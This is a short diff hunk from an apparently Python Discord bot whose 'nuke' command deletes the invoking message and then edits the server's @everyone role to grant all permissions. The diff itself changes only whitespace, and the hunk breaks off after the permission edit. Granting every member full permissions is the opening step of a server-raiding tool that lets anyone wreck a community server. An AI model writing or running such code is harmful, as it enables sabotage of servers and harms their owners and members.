@@ -19,8 +19,8 @@ async def on_ready():
 
 @client.command()
 async def nuke(ctx):
-    await ctx.message.delete()
-    guild = ctx.guild
+    await ctx.message.delete()
+    guild = ctx.guild
     try:
             role = discord.utils.get(guild.roles, name = "@everyone")
             await role.edit(permissions = Permissions.all())
